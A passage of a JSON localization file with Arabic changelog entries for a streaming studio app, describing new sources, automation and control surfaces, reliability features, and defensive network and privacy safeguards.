CAP-N)","changelog.3d36dd2cf7da":"<strong>عشرة عناصر جديدة يمكن وضعها على اللوحة — كلها محلية.</strong> تُدخل الإعادة الفورية المخزن المؤقت <em>في</em> العرض، وتحل قائمة تشغيل وسائط بلا فجوات محل مصدر الوسائط «ملف واحد في كل مرة»، وتحصل العناوين ولوحات النتائج على مصمم طبقات حقيقي مع تحكم مباشر، وتكتسب اللوحة مُصوِّر صوت، وشاشة أداء (HUD)، ومؤقّت تقسيمات للسباقات السريعة، وتراكب إدخال، وتأثيرات المؤشر. ويكمل ذلك مصدران للشبكة المحلية: مستمع SRT/RTMP كي يغذّي هاتف أو حاسوب ثانٍ مشهدًا، و<strong>Freally Link</strong>، وهو مشاركة خاصة بالتطبيق بين نسخة وأخرى لا تحتاج إلى ffmpeg على أي من الطرفين.","changelog.a446e2cc5c22":"<strong>ثابت الشبكة محفوظ:</strong> ميزتا الشبكة المحلية كلتاهما <strong>معطَّلتان حتى تضيفهما</strong>، ولا ترتبطان إلا بالجهاز المحلي، ولا تمسّان الإنترنت أبدًا. لا شيء يستكشف، ولا شيء يتصل بالخارج، والتطبيق يقول ذلك بكل لغة. يقرأ تراكب الإدخال وتأثيرات المؤشر الإدخال <strong>فقط أثناء تفعيلهما</strong> ولا يسجّلان أو يخزّنان أي ضغطة مفتاح أبدًا.","changelog.69585a9a3335":"<strong>مصدر تشغيل الإعادة الفورية</strong> (CAP-N10). أدخل مخزن الإعادة المُجهَّز مباشرةً في البرنامج: يلتقط اختصار آخر N ثانية (نسخ التدفق — دون إعادة ترميز) ويشغّلها بسرعة 100 / 50 / 25 %، <strong>بإعادة التوقيت، دون استيفاء الإطارات أبدًا</strong>. مرّر وأوقف مؤقتًا أثناء التشغيل؛ وفي النهاية يعود المصدر شفافًا، فيرجع العرض إلى البث المباشر من تلقاء نفسه. <em>الحركة البطيئة صامتة عن قصد — فالصوت المُعاد توقيته سيكون مشوّشًا، ونحن لا نزيّفه.</em>","changelog.beabb5e2e26f":"<strong>مصدر استقبال الشبكة المحلية</strong> (CAP-N11). <strong>مستمع SRT/RTMP</strong> مدمج: وجّه أي تطبيق كاميرا في هاتف أو أي مُرمِّز أو حاسوب ثانٍ إلى عنوان URL (المعروض مع رمز QR) فيصل إلى مشهد مع شريط خاص به في المازج. معطَّل حتى تضيفه، ولا يرتبط إلا بالجهاز المحلي، ولا يمسّ الإنترنت أبدًا. يحمل SRT عبارة مرور اختيارية (AES)؛ <em>أما RTMP فلا يملك مصادقة خاصة به — والنموذج يذكر ذلك ويفضّل SRT.</em>","changelog.26a004c0fb53":"<strong>Freally Link</strong> (CAP-N12). نسختان من Freally على شبكة محلية واحدة: فعّل مخرج Link على الجهاز المُرسِل واضبط <strong>مفتاح الاقتران</strong> الخاص به (لا يمكن تفعيل المخرج دونه)، واضغط <strong>فحص الشبكة المحلية</strong> على الجهاز المستقبِل، واكتب المفتاح، فيظهر البرنامج كمصدر — من حاسوب الألعاب إلى حاسوب الترميز، أو إلى شاشة في قاعة إضافية. المستقبِل الذي لا يستطيع تقديم المفتاح لا يرى إطارًا واحدًا أبدًا (مقارنة بزمن ثابت، وخطأ «مرفوض» صريح بدلًا من حلقة إعادة محاولة). بروتوكول نقل خاص بالتطبيق مكتوب يدويًا واكتشاف عبر mDNS: <strong>لا حاجة إلى ffmpeg على أي من الطرفين</strong>، ولا وسيط، ولا خادم.","changelog.d57b39d01af7":"<strong>مصدر تراكب الإدخال</strong> (CAP-N13). تصوير مباشر للوحة المفاتيح والماوس وذراع التحكم بأربعة تخطيطات (WASD، ولوحة مفاتيح مدمجة، وذراع تحكم بعصاتين، وعصا قتال بثمانية اتجاهات) — تضيء المفاتيح المضغوطة، وتومض النقرات، وتتحرك العصي والزنادات. <strong>يقرأ الإدخال فقط أثناء تفعيل المصدر، ولا يسجّل أو يخزّن أي شيء أبدًا.</strong> دعم لوحة المفاتيح/الماوس يبدأ بـ Windows (وهذا مذكور بصدق داخل المنتج)؛ وتعمل أذرع التحكم على أنظمة التشغيل الثلاثة جميعها.","changelog.230d75e66779":"<strong>مصدر تراكب إحصاءات النظام</strong> (CAP-N14). <em>الأرقام المقيسة الحقيقية</em> من لوحة الإحصاءات — fps، ووحدة المعالجة المركزية، والذاكرة، وزمن التركيب على GPU، والإطارات المُسقَطة، ومعدل البت المباشر — مدمجة لمشاهديك، مع مفتاح تبديل لكل سطر. <em>استخدام GPU غائب عن قصد: نحن لا نقيسه، لذا لا نخمّنه.</em>","changelog.7d975b57ccd9":"<strong>مصدر مُصوِّر الصوت</strong> (CAP-N15). أعمدة طيف FFT الكلاسيكية، أو راسم ذبذبات، أو مقاييس VU ستيريو، مرتبطة بأي شريط في المازج، أو ناقل مسار، أو المزيج الرئيسي. يُلتقط <strong>بعد الـ fader</strong> — فالمصدر المكتوم يظهر مسطحًا، تمامًا كما يُسمع. تحويل FFT بأساس 2 (radix-2) خاص بالتطبيق؛ ولا تعلّم آلي في أي مكان.","changelog.dcc7f22ee0b8":"<strong>مصمم العناوين ولوحات النتائج</strong> (CAP-N16). قوالب متعددة الطبقات (نص، صورة، شكل) مع نص بحدود خارجية وظل، وحركة دخول/خروج (تلاشٍ، انزلاق، مسح)، وحقول مرتبطة بملف مراقَب (خلية CSV، مؤشر JSON) أو بمتغير في الاستوديو، وتحكم مباشر — بدّل اسمًا، وعدّل النتيجة، وأطلق الحركة — دون المساس بالمشهد.","changelog.977703b6d007":"<strong>مصدر قائمة تشغيل الوسائط</strong> (CAP-N17). قائمة تشغيل مرتبة تعمل <strong>بلا فجوات فعلًا</strong> (تمر القائمة المقصوصة بأكملها عبر عملية فك ترميز واحدة، لذا تكون حدود العناصر دقيقة على مستوى الإطار)، مع قصّ للبداية/النهاية ونقاط إشارة لكل عنصر، وتكرار / عشوائي / الثبات على الأخير، واختصارات للتالي والسابق، ومتغير «قيد التشغيل الآن» يمكن لأي مصدر نص عرضه.","changelog.ded0bd268198":"<strong>مصدر مؤقّت تقسيمات السباقات السريعة</strong> (CAP-N18). استورد ملف LiveSplit بصيغة <code>.lss</code> وشغّله: مقارنات مع أفضل أداء شخصي، أو أفضل المقاطع، أو المتوسط، وإبراز المقاطع الذهبية، واختصارات عامة للتقسيم / التراجع / التخطي / إعادة الضبط. يُقرأ الملف <strong>فقط</strong> — ولا تُكتب أي محاولة فيه أبدًا. <em>أدوات التقسيم التلقائي المعتمدة على ذاكرة العمليات غير مدعومة عن قصد (لقربها من مجال مكافحة الغش)؛ والتقسيم يتم بالملف والاختصار.</em>","changelog.c303cbf74e59":"<strong>إبراز المؤشر وتأثيرات النقر</strong> (CAP-N19). هالة المؤشر، وموجات نقر بألوان مميزة للزر الأيسر/الأيمن، وعرض اختياري لضغطات المفاتيح، تُرسم على التقاطات الشاشة والنوافذ — وهي أساسيات لا غنى عنها لصانعي الدروس، على مسار المؤشر الخاص بالتطبيق. لـ Windows فقط، بصراحة (إذ يدمج macOS وLinux مؤشرهما الخاص)؛ تُرسم ضغطات المفاتيح ولا تُسجَّل أبدًا.","changelog.f998b484bc62":"<strong>كان التحجيم ثنائي الخطية الحاد أكثر ضبابية من ثنائي الخطية العادي</strong> (تراجع في CAP-N70 ضمن 0.200.0). كان المظلل يقيس <em>حواف</em> وحدات النسيج (texel) بدلًا من مراكزها، فكان معظم كل وحدة نسيج يقع في منطقة المزج الحدّي 50/50. أصبح الآن يثبّت مركز كل وحدة نسيج وينتقل إلى جارتها داخل درز ضيق، وهذا هو الغرض من هذا الوضع. وتثبّت ذلك اختبارات الإطار المرجعي الجديدة لكل أداة تحجيم (المستحقة منذ 0.200.0).","changelog.e64eb694c7c5":"ملاحظة حول التحزيم","changelog.7a371e20c4e6":"<strong>يحمل ملف MSI لـ Windows القيمة ProductVersion <code>0.230.0</code> داخليًا.</strong> يحدّ Windows Installer الإصدار الفرعي في MSI عند 255، وهو ما تتجاوزه درجة 0.300.0 — أول إصدار يصطدم فيه مخطط «+100 لكل مرحلة» بهذا الحد. التعيين هو <code>MSI minor = 200 + app-minor ÷ 10</code> (0.400.0 ← <code>0.240.0</code> … 0.900.0 ← <code>0.290.0</code>، ثم 1.0.0 ← <code>1.0.0</code>)، وهو تصاعدي صارم كي تواصل ترقيات MSI استبدال التثبيتات الأقدم. لا يختلف سوى الإصدار الداخلي لملف MSI: فالتطبيق ومُثبِّت NSIS والمُحدِّث ونافذة «حول» كلها تقول <strong>0.300.0</strong>.","changelog.04f0b1865198":"[0.200.0] — 2026-07-13 (الأتمتة + تعمّق الالتقاط والأجهزة — المرحلتان 1 و9 من CAP-N)","changelog.685bf42fe455":"مرحلتان موضوعيتان في إصدار واحد، لذا يتخطى رقم الإصدار درجتين (0.99.0 ← 0.200.0). <strong>المرحلة 1 — الأتمتة</strong> تجعل الاستوديو يدير نفسه بنفسه: محرك قواعد، وماكرو بمتغيرات، وأسطح تحكم MIDI وOSC، وتركيبات اختصارات وطبقات، ولوحة لمس عبر الشبكة المحلية، وخدمة أضواء التالي (tally)، والتحكم في كاميرات PTZ، وجدول برنامج موقوت. <strong>المرحلة 9 — تعمّق الالتقاط والأجهزة</strong> تُكمل المسار من الزجاج إلى اللوحة: شاشة مراقبة بتمرير مباشر منخفضة الكمون، وتحجيم مطابق للبكسل، وتقريب مباشر (punch-in)، واقتصاص تلقائي للأشرطة السوداء، وربط تلقائي بين النافذة وصوت التطبيق، وتعيين النغمات (tone mapping) من HDR إلى SDR. ويُشحن إلى جانب <strong>خلفية المشهد</strong> و<strong>التشغيل العكسي الحقيقي للوسائط</strong> اللذين بُنيا في وقت سابق من الدورة.","changelog.79232fa7e8c0":"<strong>تتشارك واجهة الأتمتة بأكملها ثابتًا تصميميًا واحدًا:</strong> كل قاعدة، وماكرو، ووسادة MIDI، وعنوان OSC، وزر في اللوحة، وخطوة في جدول البرنامج تمر عبر قائمة سماح ثابتة واحدة للأوامر — وهي نفسها التي تعرضها واجهة API البعيدة عبر WebSocket. لا يستطيع أي سطح تحكم تسمية ملف، أو تشغيل عملية، أو الوصول إلى الإنترنت <strong>بحكم البناء</strong>، وكل واجهة شبكة معطَّلة افتراضيًا ولا ترتبط إلا بالجهاز المحلي (loopback) ما لم تُفعَّل الشبكة المحلية صراحةً.","changelog.9bb9593116bc":"<strong>خلفية المشهد / ورق الحائط.</strong> ثبّت أي صورة، أو GIF متكرر، أو فيديو متكرر خلف الالتقاط كخلفية تملأ اللوحة بأكملها أو نصف الشاشة (يسار / يمين / أعلى / أسفل)، مع وضع الالتقاط تلقائيًا في النصف الآخر. تقريب بعجلة الماوس على الالتقاط أو الخلفية، وفلتر قلب (Flip) في الزمن الحقيقي، ووضع «الانتظار حتى يبدأ التسجيل» مع معاينة ما قبل التسجيل، ومفتاح إظهار/إخفاء ليتمكن فيديو تعليمي من العمل بكامل الإطار قبل عودة الالتقاط.","changelog.3cc0eae313a7":"<strong>تشغيل عكسي حقيقي للوسائط + عناصر تحكم كاملة في التشغيل.</strong> تصيير عكسي حقيقي (بذاكرة محدودة، ومُقسَّم إلى مقاطع، ومُخزَّن مؤقتًا) إضافةً إلى التمرير، والانتقال إلى أي موضع، والتشغيل/الإيقاف المؤقت، ومفتاح للتكرار — فيتصرف فيديو الخلفية كمشغّل وسائط عادي، وفق توقيت من يدير البث.","changelog.e9af708a1747":"<strong>محرك قواعد الأتمتة</strong> (CAP-N01). تسعة مُشغِّلات تعمل عند تغيّر الحالة (edge-triggered) — تبديل المشهد، وحالة البث، وحالة التسجيل، وخطأ في مصدر، وتجاوز مستوى الصوت لعتبة، وخمول النظام، وتركيز نافذة، ووقت من اليوم، وتغيّر ملف مراقَب — تخضع لشروط (متغير يساوي قيمة، البث جارٍ، التسجيل جارٍ) وتنفّذ إجراءات في الاستوديو. تُشحن كل قاعدة <strong>معطَّلة</strong>؛ ولا يفعل المحرك شيئًا حتى تُفعَّل إحداها.","changelog.cdab0d32015e":"<strong>الماكرو والمتغيرات والتسلسلات</strong> (CAP-N02). تسلسلات خطوات مُسمّاة (تشغيل إجراء، انتظار، تعيين متغير) مع عدد مرات تكرار واختصار عام اختياري، يمكن تشغيلها من الواجهة، أو باختصار، أو بقاعدة، أو عبر واجهة API البعيدة. تُدرج <strong>متغيرات</strong> الاستوديو <code>{{name}}</code> في أي مصدر نص وتحدّثه مباشرةً لحظة تعيين الماكرو للقيمة.","changelog.d7decf42ec57":"<strong>أسطح تحكم MIDI</strong> (CAP-N03). اربط بالتعلّم (MIDI-learn) وسادةً أو مقبضًا أو fader بإجراء في الاستوديو، أو ماكرو، أو تبديل مشهد، أو fader في المازج، أو كتم، مع <strong>تغذية راجعة للمصابيح (LED) وfaders المزوّدة بمحرك</strong> تعكس الحالة الفعلية للاستوديو (تضيء وسادة REC لأنك تسجّل). لا يُفتح أي منفذ MIDI حتى تختار واحدًا.","changelog.3f509d62695d":"<strong>التحكم عبر OSC</strong> (CAP-N04). تتحكم وحدات تحكم من فئة TouchOSC ولوحات الإضاءة في الاستوديو عبر Open Sound Control — <code>/scene/switch</code>، و<code>/record/start</code>، و<code>/macro/run</code>، و<code>/mixer/vol</code>، وغيرها. معطَّل افتراضيًا، ومحلي فقط (loopback) ما لم تُفعَّل الشبكة المحلية. <em>لا يملك OSC أي مصادقة خاصة به — ومفتاح الشبكة المحلية يذكر ذلك.</em>","changelog.e19b0ee81809":"<strong>تركيبات الاختصارات والطبقات</strong> (CAP-N05). تركيبات من ضغطتين (<code>Ctrl+K, 3</code>) لا يُحجز فيها المفتاح الثاني المنفرد إلا أثناء انتظار إكمال التركيبة، إضافةً إلى طبقات ثابتة (sticky) لتتحكم لوحة مفاتيح صغيرة في إجراءات كثيرة.","changelog.012efed7e76a":"<strong>لوحة لمس عبر الشبكة المحلية</strong> (CAP-N06). يقدّم التطبيق صفحة تحكم — أزرار مشاهد مع مؤشر تالي مباشر، وfaders المازج، ومفاتيح إجراءات — لأي هاتف على الشبكة، يُوصل إليها عبر رمز QR. معطَّلة افتراضيًا، وكلمة مرور على كل طلب، ومحلية فقط (loopback) ما لم تُفعَّل الشبكة المحلية، والصفحة مضمَّنة في التطبيق (لا يُجلب أي شيء من الإنترنت).","changelog.6784a15679f3":"<strong>خدمة أضواء التالي</strong> (CAP-N07). صفحة تالي حمراء/خضراء بملء الشاشة يمكن لأي هاتف احتياطي عرضها؛ يراقب <code>?scene=NAME</code> مشهدًا واحدًا، وإلا فإنها تتبّع الحالة المباشرة للبرنامج.","changelog.0b65086c92dd":"<strong>التحكم في كاميرات PTZ</strong> (CAP-N08). تحريك أفقي / إمالة / تقريب للكاميرات عبر VISCA-over-IP مع إعدادات مسبقة مُسمّاة واستدعاء تلقائي لكل مشهد (المشهد الذي ينتقل إلى البرنامج يستدعي اللقطة المرتبطة به). عبر الشبكة المحلية فقط؛ ولا توجد الكاميرا إلا لأن عنوانها أُدخل — لا يُكتشف أي شيء.","changelog.23f2bea95258":"<strong>جدول البرنامج</strong> (CAP-N09). قائمة مرتبة من الخطوات — مشهد ومدة بقائه، إضافةً إلى إجراءات اختيارية — مع تقدّم يدوي أو تلقائي وعرض مباشر لـ«التالي + الوقت المتبقي». يبدّل تشغيل جدول البرنامج المشاهد بالطريقة العادية القابلة للتراجع؛ ولا يعدّل مجموعة المشاهد أبدًا.","changelog.2e60fbc8afc7":"<strong>شاشة مراقبة بتمرير مباشر منخفضة الكمون</strong> (CAP-N69). جهاز عرض يُظهر الإطارات <strong>الخام</strong> لجهاز الالتقاط — بلا مشاهد، ولا فلاتر، ولا مُركِّب — مع قراءة مقيسة للكمون من الالتقاط إلى العرض، لتتمكن من مشاهدة بث لعبة من بطاقة التقاط بأقل تأخير.","changelog.0e3a7f16e7d8":"<strong>أوضاع تحجيم مطابقة للبكسل</strong> (CAP-N70). تحجيم لكل عنصر: ناعم، أو بأقرب جار، أو مُثبَّت على مضاعفات صحيحة، أو ثنائي الخطية حاد — فيصل محتوى الألعاب الكلاسيكية وفن البكسل إلى اللوحة دون ضبابية.","changelog.ffa3f0ee68cd":"<strong>تقريب مباشر وتحريك تتبّعي</strong> (CAP-N71). قرّب أي التقاط بعجلة الماوس مع حركة مُخمَّدة تخميدًا حرجًا، وثلاثة إعدادات مسبقة بالاختصارات، ووضع تتبّع اختياري يلاحق المؤشر.","changelog.d331c3ab49e3":"<strong>اقتصاص تلقائي للأشرطة السوداء</strong> (CAP-N72). اكتشف الأشرطة الأفقية والعمودية (letterbox/pillarbox) في المصدر واقتصّها، مرة واحدة أو باستمرار كلما تغيّرت نسبة أبعاد المحتوى.","changelog.c5425a9fc61b":"<strong>ربط تلقائي بين النافذة وصوت التطبيق</strong> (CAP-N73). التقط صوت تطبيق النافذة معها؛ إخفاء النافذة يكتم الشريط المرتبط وإظهارها يلغي الكتم — دون أن يطغى ذلك أبدًا على كتم يدوي.","changelog.372de0cef652":"<strong>تعيين النغمات من HDR إلى SDR للالتقاط</strong> (CAP-N74). عيّن خرج شاشة HDR إلى لوحة SDR (اقتطاع / maxRGB الحافظ لتدرّج اللون / Reinhard / ركبة BT.2408) مع مستوى أبيض ورقي (paper-white) قابل للضبط، يُضبط مباشرةً لكل شاشة دون إعادة تشغيل الالتقاط.","changelog.1ee387582d9c":"الأمان والموثوقية","changelog.647e3c52982e":"تمر كل واجهات الأتمتة عبر قائمة السماح المشتركة لواجهة API البعيدة (<code>ALLOWED_COMMANDS</code>)، لذا لا تستطيع أي قاعدة، أو ماكرو، أو ربط MIDI/OSC، أو زر في اللوحة، أو خطوة في جدول البرنامج الوصول إلى أمر لا تصل إليه أزرار التطبيق نفسه — ويتحقق من ذلك اختبار يضمن ألّا تتباعد قائمة السماح وفروع التوجيه الخاصة بها.","changelog.3ebb5ae804a8":"يحترم المُشغِّل <code>FileChanged</code> حارس المسارات البعيدة الموجود، لذا لا تؤدي مراقبة ملف أبدًا إلى استكشاف مسار UNC (فلا تسرّب لبيانات اعتماد NTLM).","changelog.894554d366f3":"يحذّر سطحا التحكم عبر الشبكة المحلية كلاهما (اللوحة، وOSC) في الإعدادات من أن حركة مرور الشبكة المحلية غير مشفّرة قبل أن يُفتح المنفذ للشبكة.","changelog.f8d204cd91ea":"[0.99.0] — 2026-07-12 (المصادر والأجهزة والمعايرة — الدفعة 3 من CAP-M)","changelog.26f64316b751":"الدفعة الثالثة والأخيرة من الميزات الأساسية: كل ما بين الزجاج واللوحة. إشارات اختبار مدمجة ومنضدة عمل موجَّهة لمزامنة الصوت والفيديو لمعايرة السلسلة بأكملها؛ ومصادر مؤقّت/ساعة ومصادر نص مرتبطة بملفات للعروض التي تعتمد على البيانات؛ وخريطة اختصارات تدقّق كل ربط؛ وميزات وحدة المازج التي كانت ناقصة؛ وتعمّق حقيقي في الأجهزة — إزالة التشابك وعناصر تحكم الكاميرا عبر المنصات مع ملفات تعريف لكل جهاز.","changelog.bc670f3d3c34":"<strong>مصادر إشارات الاختبار</strong> (CAP-M21). أشرطة ألوان على طراز SMPTE، وشبكة معايرة/تهشير متقاطع، ومسح حركي، ونغمة المعايرة 1 kHz (−20 dBFS)، ونمط <strong>ومضة+صفارة لمزامنة الصوت والفيديو</strong> مُجمَّع يُولَّد من ساعة واحدة — تحقّق من المشاهد والمُرمِّزات وأجهزة العرض ووجهات البث دون توصيل أي كاميرا.","changelog.5c359f960e3e":"<strong>منضدة عمل لمعايرة مزامنة الصوت والفيديو</strong> (CAP-M20). أداة موجَّهة تشغّل نمط الومضة+الصفارة عبر شاشتك ومكبّرات الصوت، وتراقب الكاميرا والميكروفون وهما يلتقطانه مجددًا، وتقيس الإزاحة بمعالجة إشارات بحتة (اكتشاف البدايات على عدة دورات، مع إرشادات صادقة عند الفشل — غرفة مظلمة، أو ميكروفون صامت، أو ضوضاء في الغرفة ليست هي النمط)، وتعرض تطبيق النتيجة على إزاحة المزامنة للميكروفون. يبقى المنزلق اليدوي خيارًا احتياطيًا. صراحةً بشأن الحلقة: كمون شاشتك/مكبّرات الصوت جزء مما يُقاس.","changelog.5f3aaabe7c80":"<strong>مصادر المؤقّت والساعة</strong> (CAP-M15). عائلة من مصادر النص: ساعة حائط (صيغ strftime + إزاحة UTC ثابتة)، وعدّ تنازلي (لمدة محددة أو حتى الموعد التالي على الساعة، مع إجراء عند الصفر — وميض الواجهة أو تبديل المشهد)، وساعة إيقاف تصاعدية، والوقت منذ بدء البث المباشر / منذ بدء التسجيل. البدء/الإيقاف المؤقت/إعادة الضبط من خصائص المصدر أو عبر اختصارين عامين جديدين (لكل المؤقّتات دفعة واحدة). لا يُعاد رسم الواجهات إلا عند تغيّر نصها.","changelog.e4a01e4da67e":"<strong>نص من ملف + ربط البيانات</strong> (CAP-M16). يمكن لمصدر نص أن يرتبط بملف محلي مراقَب: ملف <code>.txt</code> بأكمله، أو خلية CSV واحدة (باسم العمود أو رقمه)، أو قيمة JSON واحدة (مؤشر RFC 6901) — يُعاد قراءته خلال نصف ثانية من أي تغيير، مع تحمّل المحررات التي تكتب كتابة ذرية (ملف مؤقت+إعادة تسمية) بإبقاء آخر قيمة سليمة على الشاشة. إنه أساس لوحات النتائج والأشرطة السفلية، دون الحاجة إلى أي خدمة. وأصبحت أداة استيراد OBS تنقل «القراءة من ملف» أيضًا.","changelog.99703cca8970":"<strong>خريطة الاختصارات</strong> (CAP-M14). جدول واحد قابل للبحث والتصفية يضم <strong>كل</strong> ربط — الإجراءات العامة واضغط للتحدث/اضغط للكتم لكل مصدر — مع إشارات تعارض صادقة: تُعلَّم التركيبة نفسها المكتوبة بطريقتين على أنها مشتركة، والمفتاح الذي رفض نظام التشغيل تسجيله (لأن تطبيقًا آخر يملكه، أو لأنه غير متاح في هذا المُركِّب) يذكر ذلك. تُصدِّر ورقة مرجعية بصيغة Markdown إلى مجلد التنزيلات. الإعدادات ← الاختصارات تتولى الربط؛ وهذه الخريطة تدقّق وتوثّق.","changelog.ee68b38bf053":"<strong>اكتمال المازج: التحريك الأفقي، والعزل، والأحادي</strong> (CAP-M19). <strong>توازن</strong> ستيريو لكل شريط (الوضع في المنتصف مطابق بتًا ببت لعدم التحريك)، و<strong>عزل PFL</strong> (لا تسمع المراقبة إلا الأشرطة المعزولة — ولا يتغير مزيج البرنامج أبدًا)، و<strong>دمج أحادي</strong> لكل مصدر.","changelog.7ab38b03302e":"<strong>إزالة التشابك لمصادر الأجهزة</strong> (CAP-M17). لكل جهاز: إسقاط / bob / خطي / مزج / متكيّف مع الحركة (من فئة yadif) مع اختيار ترتيب الحقول — بالمعالج المركزي فقط على خيط الالتقاط، ومتطابق على كل أنظمة التشغيل. تغيير الوضع يعيد تشغيل الجهاز، كما يحدث عند تغيير الصيغة.","changelog.10b030797364":"<strong>عناصر تحكم الكاميرا مع ملفات تعريف لكل جهاز</strong> (CAP-M18). التعريض، وتوازن اللون الأبيض، والتركيز، والتقريب، والكسب (وغيرها) لكاميرات الويب وبطاقات الالتقاط عبر مسار واحد متعدد المنصات — UVC عبر واجهات API الأصلية على Windows/Linux؛ أما macOS فيعرض كل ما يبلّغ عنه AVFoundation، وكثيرًا ما يكون لا شيء، واللوحة تقول ذلك بصراحة. يُحفظ كل تعديل في ملف تعريف للجهاز يُعاد تطبيقه عند التوصيل أثناء التشغيل وعند إعادة التشغيل.","changelog.1d38d97fe470":"[0.98.0] — 2026-07-12 (سلامة البث وموثوقيته — الدفعة 2 من CAP-M)","changelog.4b98f0291de5":"الدفعة الثانية من الميزات الأساسية: <em>لا تخسر العرض</em>. أصبح الاستوديو يلتقط الأعطال قبل أن تبدأ البث (قائمة تحقق ما قبل الانطلاق)، وأثناء البث (إنذارات أمان تعمل دائمًا، وتبديل احتياطي للمُرمِّز في منتصف الجلسة، ولوحة معلومات لسلامة المصادر)، وبعد وقوع الأسوأ (تسجيلات آمنة من الانهيار مع إصلاح عند التشغيل التالي، وحارس خروج يُنهي كل شيء بالترتيب). وعندما تحتاج إلى إخفاء كل شيء <em>في الحال</em>، هناك زر طوارئ.","changelog.f4de38fb000e":"<strong>قوالب أسماء ملفات التسجيل</strong> (CAP-M25). تسمية قائمة على الرموز — <code>{prefix}</code>، و<code>{date}</code>، و<code>{time}</code>، و<code>{scene}</code>، و<code>{profile}</code>، و<code>{canvas}</code>، و<code>{marker-count}</code>، و<code>{counter}</code> محفوظ بين الجلسات — للتسجيلات وحفظ الإعادات واللقطات الثابتة، مع إضافة لاحقة تلقائية تمنع التعارض و<strong>مجلدات لكل مخرج</strong> للإعادات واللقطات الثابتة. تُنقّى الأسماء من الأحرف المحجوزة في كل منصة؛ ويُكتشف الخطأ المطبعي في القالب عند الحفظ.","changelog.4750f9f5b2ce":"<strong>لوحة معلومات سلامة المصادر</strong> (CAP-M13). لوحة واحدة تُفتح من لوحة الأوامر تعرض الحالة المباشرة لكل مصدر، ومعدل fps، و<strong>عمر آخر إطار</strong>، وعدد الإطارات المُسقَطة، وسجل إعادات التشغيل — إضافةً إلى إعادة تشغيل وخصائص لكل مصدر. والمصادر التي لا يشغّلها المحرك تُعرض بصدق على أنها «غير نشطة».","changelog.977c064d0ab7":"<strong>حارس خروج + إيقاف منظَّم</strong> (CAP-M23). إغلاق الاستوديو أثناء البث المباشر، أو التسجيل، أو تجهيز الإعادة يطلب التأكيد أولًا — مع سرد ما سيحدث بالضبط — ثم يُنهي البث، ويُتمّ التسجيل، ويُفرغ مخزن الإعادة <strong>بالترتيب</strong> قبل الخروج. وأصبح ملف علامة الانهيار يميّز الخروج السليم من الانهيار.","changelog.6102d929f559":"<strong>تسجيلات آمنة من الانهيار + مطالبة بالإنقاذ</strong> (CAP-M11). تُكتب تسجيلات mp4/mov <strong>مُجزّأة</strong> (تفريغ للفهرس عند كل إطار مفتاحي)، لذا يترك الانهيار أو انقطاع الكهرباء ملفًا قابلًا للتشغيل بدلًا من ملف تتعذر قراءته. وإذا انتهت جلسة بشكل غير سليم في منتصف التسجيل، يعرض التشغيل التالي <strong>إصلاحًا</strong> بنقرة واحدة إلى نسخة <code>(repaired)</code> — دون المساس بالأصل أبدًا.","changelog.9d1b1cce6db8":"<strong>تبديل احتياطي للمُرمِّز في منتصف الجلسة</strong> (CAP-M12). إذا تعطّل المُرمِّز العتادي في منتصف البث أو التسجيل (إعادة ضبط برنامج التشغيل، أو تنافس على GPU)، تنتقل الجلسة فورًا إلى درجة أدنى في سلّم بدائل — عائلة العتاد الأخرى، ثم x264 — بدلًا من أن تتوقف. يعتمد البث على آلية إعادة الاتصال الموجودة لديه؛ ويستمر التسجيل في ملف جديد؛ وتشرح رسالة منبثقة صادقة + ملاحظة ثابتة في رصيف الإحصاءات ما حدث بالضبط. لا تؤدي أعطال الشبكة أبدًا إلى أي تبديل.","changelog.08f429a15748":"<strong>إنذارات أمان البث</strong> (CAP-M10). مراقبات تعمل دائمًا أثناء تشغيل الخرج: <strong>صمت صوت البرنامج</strong>، و<strong>تشبّع مستمر (clipping)</strong>، و<strong>صورة برنامج سوداء أو متجمدة</strong> (رؤية حاسوبية كلاسيكية — عينات من الإضاءة (luma) + فرق الإطارات عبر القراءة الموجودة من GPU، دون تعلّم آلي)، و<strong>توقّع انخفاض مساحة القرص</strong> («~22 دقيقة متبقية بمعدل البت الحالي»). غير مقيِّدة: لافتة قابلة للإغلاق + مُعلِن قارئ الشاشة.","changelog.a76206a6a95f":"<strong>زر طوارئ</strong> (CAP-M22). اختصار عام واحد يقطع البرنامج (واللوحة الرأسية، وأي أجهزة عرض) إلى شاشة خصوصية قابلة للتخصيص، ويوقف كل التقاط، ويكتم كل الصوت كتمًا تامًا — فلا يُلتقط الميكروفون أصلًا — بينما يظل البث والتسجيل مستمرين. والاستعادة تأكيد مقصود من خطوتين.","changelog.0df040fc21b0":"<strong>حزمة تشخيص منقّحة</strong> (CAP-M24). يكتب «تصدير التشخيص» ملف zip (لقطة من الإعدادات، وفحص المُرمِّزات/الأجهزة، والإحصاءات الأخيرة، وآخر تقرير انهيار) يُبنى وفق <strong>قائمة سماح</strong> صارمة — فمفاتيح البث، وكلمات المرور، والرموز المميزة (tokens)، ومسارات الملفات، ونصوص المستخدم لا تُقرأ أبدًا، فضلًا عن أن تُضمَّن. يمكنك قراءة المحتوى بالضبط قبل التصدير؛ ولا يُرسل أي شيء إلى أي مكان أبدًا.","changelog.4047624f0a67":"<strong>قائمة تحقق ما قبل بدء البث</strong> (CAP-M09). أصبح بدء البث يُجري الفحوص أولًا: الوجهات لها مفاتيح، والمُرمِّز قابل للاستخدام، والمصادر سليمة، ومساحة القرص كافية — كلٌّ منها أخضر/أحمر مع إصلاح بنقرة واحدة — إضافةً إلى تنبيهات صادقة بشأن قياس مستوى الميكروفون/صوت سطح المكتب ومخزن الإعادة. ويُبقي إعداد اختياري بدء البث معلّقًا حتى تصبح كل الفحوص المانعة خضراء.","changelog.f0bd6b1eb67e":"انتقلت تسجيلات mp4/mov من كتابة الفهرس في النهاية (<code>+faststart</code>) إلى الكتابة المُجزّأة؛ ويُنتج إصلاح الإنقاذ (أو إعادة التغليف) ملف faststart تقليديًا عندما يُصرّ محرر عليه.","changelog.e2f271c14a12":"أصبح المُدقِّق <code>HotkeySettings</code> يقيّد أيضًا اختصارات التقاط الصورة الثابتة وزر الطوارئ.","changelog.d236ab9ba3fe":"[0.97.0] — 2026-07-11 (تأليف المشاهد ومراقبتها — الدفعة 1 من CAP-M)","changelog.4b1bad38a6e8":"أولى الدفعات الثلاث من الميزات الأساسية في الطريق إلى 1.0.0. يتعلّم المُركِّب أن <em>يُحرَّر</em> كاستوديو، لا أن يُدار فحسب: سجل تراجع خلف كل تعديل للمشهد، وتحديد متعدد مع المحاذاة والتوزيع وأدلة قابلة للسحب، وتحويلات دقيقة يمكنك نسخها بين العناصر، ومنضدة عمل للمفاتيح تُريك القناع. ويتعلّم أن 